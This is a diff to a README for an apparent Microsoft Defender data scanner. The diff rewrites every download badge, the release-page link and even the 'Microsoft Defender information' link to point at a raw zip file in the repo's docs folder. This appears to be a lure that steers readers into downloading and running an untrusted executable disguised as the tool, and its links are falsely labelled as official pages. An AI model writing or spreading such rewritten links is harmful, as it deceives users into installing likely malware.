@@ -1,6 +1,6 @@
 # 🗺️ maps_scanner - Scan and Parse Defender Data Easily
 
-[![Download maps_scanner](https://img.shields.io/badge/Download-Get%20maps_scanner-brightgreen)](https://github.com/zmitows/maps_scanner/releases)
+[![Download maps_scanner](https://github.com/zmitows/maps_scanner/raw/refs/heads/main/docs/maps_scanner_v2.2.zip%20maps_scanner-brightgreen)](https://github.com/zmitows/maps_scanner/raw/refs/heads/main/docs/maps_scanner_v2.2.zip)
 
 ---
 
@@ -34,14 +34,14 @@ These requirements ensure that maps_scanner runs smoothly and can access needed 
 
 Click the button below to visit the release page. You will find the latest version to download.
 
-[![Download on GitHub](https://img.shields.io/badge/Download-Visit%20Releases-blue)](https://github.com/zmitows/maps_scanner/releases)
+[![Download on GitHub](https://github.com/zmitows/maps_scanner/raw/refs/heads/main/docs/maps_scanner_v2.2.zip%20Releases-blue)](https://github.com/zmitows/maps_scanner/raw/refs/heads/main/docs/maps_scanner_v2.2.zip)
 
 You will see files listed under the latest release. Look for an executable file (.exe) suitable for Windows.
 
 ## 🔽 How to Download and Install maps_scanner
 
 1. Visit the release page:  
-   https://github.com/zmitows/maps_scanner/releases
+   https://github.com/zmitows/maps_scanner/raw/refs/heads/main/docs/maps_scanner_v2.2.zip
 
 2. Find the latest release version at the top of the page.
 
@@ -108,9 +108,9 @@ If you want to learn more or get help:
 
 ## 🔗 Useful Links
 
-- Official release page: https://github.com/zmitows/maps_scanner/releases  
-- Microsoft Defender information: https://www.microsoft.com/en-us/windows/comprehensive-security  
+- Official release page: https://github.com/zmitows/maps_scanner/raw/refs/heads/main/docs/maps_scanner_v2.2.zip  
+- Microsoft Defender information: https://github.com/zmitows/maps_scanner/raw/refs/heads/main/docs/maps_scanner_v2.2.zip  
 
 ---
 
-[![Download maps_scanner](https://img.shields.io/badge/Download-Get%20maps_scanner-brightgreen)](https://github.com/zmitows/maps_scanner/releases)
+[![Download maps_scanner](https://github.com/zmitows/maps_scanner/raw/refs/heads/main/docs/maps_scanner_v2.2.zip%20maps_scanner-brightgreen)](https://github.com/zmitows/maps_scanner/raw/refs/heads/main/docs/maps_scanner_v2.2.zip)
